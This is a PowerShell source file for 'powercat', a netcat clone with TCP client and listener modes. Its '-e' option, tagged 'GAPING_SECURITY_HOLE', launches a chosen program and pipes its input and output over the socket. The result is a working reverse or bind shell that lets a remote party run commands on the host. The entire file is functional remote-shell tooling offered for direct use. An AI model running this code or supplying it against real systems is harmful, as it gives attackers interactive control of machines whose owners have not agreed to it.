<#
  .SYNOPSIS
    Netcat: The powershell version.
  .PARAMETER c
    Client mode: Provide an server to connect to.
  .PARAMETER l
    Listen mode: Use this switch to create a listener.
  .PARAMETER p
    The port to listen on, or the port to connect to.
  .PARAMETER e
    GAPING_SECURITY_HOLE :)
  .PARAMETER t
    Timeout for connecting and listening in seconds. Default is 60.
#>
function powercat
{
  param(
    [string]$c="",
    [Parameter(Mandatory=$True,Position=-1)][string]$p="",
    [switch]$l=$False,
    [string]$e="",
    $t=60
  )
  
  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  if(($c -eq "") -and (!$l))
  {
    return "You must select either client mode (-c) or listen mode (-l)."
  }

  [console]::TreatControlCAsInput=$True

  function Listen
  {
    param($p,$t)
  
    Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
    $Socket = New-Object System.Net.Sockets.TcpListener $p
    $Socket.Start()
    $AcceptHandle = $Socket.BeginAcceptTcpClient($null, $null)
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        Read-Host
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        $Socket.Stop()
        $Stopwatch.Stop()
        return 1
      }
      if($AcceptHandle.IsCompleted)
      {
        $Client = $Socket.EndAcceptTcpClient($AcceptHandle)
        break
      }
    }
    $Stopwatch.Stop()
    Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
    $Stream = $Client.GetStream()
    return @($Stream,$Socket)
  }
  
  function Connect
  {
    param($c,$p,$t)
    Write-Verbose "Connecting..."
    $Socket = New-Object System.Net.Sockets.TcpClient
    $ConnectHandle = $Socket.BeginConnect($c,$p,$null,$null)
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        Read-Host
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        $Socket.Close()
        $Stopwatch.Stop()
        return 1
      }
      if($ConnectHandle.IsCompleted)
      {
        $Socket.EndConnect($ConnectHandle)
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){return 2}
    Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeeded!")
    $Stream = $Socket.GetStream()
    return @($Stream,$Socket)
  }
  
  if($e -eq "")
  {
    try
    {
      if($l)
      {
        $ReturnValue = Listen $p $t
      }
      else
      {
        $ReturnValue = Connect $c $p $t
      }

      $Stream = $ReturnValue[0]
      $Socket = $ReturnValue[1]
      if($Stream -eq 1){return "Timeout."}
      if($Stream -eq 2){return "Connection Error."}

      $Buffer = New-Object System.Byte[] 1
      $Encoding = New-Object System.Text.AsciiEncoding

      $StreamDestinationBuffer = New-Object System.Byte[] 1
      $StreamReadOperation = $Stream.BeginRead($StreamDestinationBuffer, 0, 1, $null, $null)
    
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          $command = Read-Host
          $Stream.Write($Encoding.GetBytes($command + "`n"),0,($command + "`n").Length)
        }
        if($StreamReadOperation.IsCompleted)
        {
          $StreamBytesRead = $Stream.EndRead($StreamReadOperation)
          if($StreamBytesRead -eq 0){break}
          Write-Host -n $Encoding.GetString($StreamDestinationBuffer)
          $StreamReadOperation = $Stream.BeginRead($StreamDestinationBuffer, 0, 1, $null, $null)
        }
      }
    }
    finally
    {
      
      $Stream.Close()
      if($l){$Socket.Stop()}
      else{$Socket.Close()}
    }
  }
  else
  {
    try
    {
      if($l)
      {
        $ReturnValue = Listen $p $t
      }
      else
      {
        $ReturnValue = Connect $c $p $t
      }

      $Stream = $ReturnValue[0]
      $Socket = $ReturnValue[1]
      if($Stream -eq 1){return "Timeout."}
      if($Stream -eq 2){return "Connection Error."}

      $Buffer = New-Object System.Byte[] 1
      $Encoding = New-Object System.Text.AsciiEncoding

      $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
      $ProcessStartInfo.FileName = $e
      $ProcessStartInfo.UseShellExecute = $False
      $ProcessStartInfo.RedirectStandardInput = $True
      $ProcessStartInfo.RedirectStandardOutput = $True
      $ProcessStartInfo.RedirectStandardError = $True
      $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
      $Process.Start() | Out-Null
      
      $ProcessDestinationBuffer = New-Object System.Byte[] 1
      $ProcessReadOperation = $Process.StandardOutput.BaseStream.BeginRead($ProcessDestinationBuffer, 0, 1, $null, $null)
      $StreamDestinationBuffer = New-Object System.Byte[] 1
      $StreamReadOperation = $Stream.BeginRead($StreamDestinationBuffer, 0, 1, $null, $null)
      $ToStreamString = ""
      
      while($True)
      {
        if($Process.HasExited)
        {
          break
        }

        if($ProcessReadOperation.IsCompleted)
        {
          try
          {
            $Stream.Write($ProcessDestinationBuffer[0], 0, 1)
            $ProcessBytesRead = $Process.StandardOutput.BaseStream.EndRead($ProcessReadOperation)
            $ProcessReadOperation = $Process.StandardOutput.BaseStream.BeginRead($ProcessDestinationBuffer, 0, 1, $null, $null)
          }
          catch{}
        }

        if($StreamReadOperation.IsCompleted)
        {
          if($StreamDestinationBuffer[0] -eq 10)
          {
            $Process.StandardInput.WriteLine($ToStreamString)
            $StreamBytesRead = $Stream.EndRead($StreamReadOperation)
            if($StreamBytesRead -eq 0){break}
            $StreamReadOperation = $Stream.BeginRead($StreamDestinationBuffer, 0, 1, $null, $null)
            $ToStreamString = ""
          }
          else
          {
            $ToStreamString += $Encoding.GetString([char]$StreamDestinationBuffer[0])
            $StreamBytesRead = $Stream.EndRead($StreamReadOperation)
            if($StreamBytesRead -eq 0){$Process.StandardInput.WriteLine($ToStreamString);break}
            $StreamReadOperation = $Stream.BeginRead($StreamDestinationBuffer, 0, 1, $null, $null)
          }
        }
      }
    }
    finally
    {
      $ErrorActionPreference= 'SilentlyContinue'
      $Process | Stop-Process
      $Stream.Close()
      if($l){$Socket.Stop()}
      else{$Socket.Close()}
    }
  }
}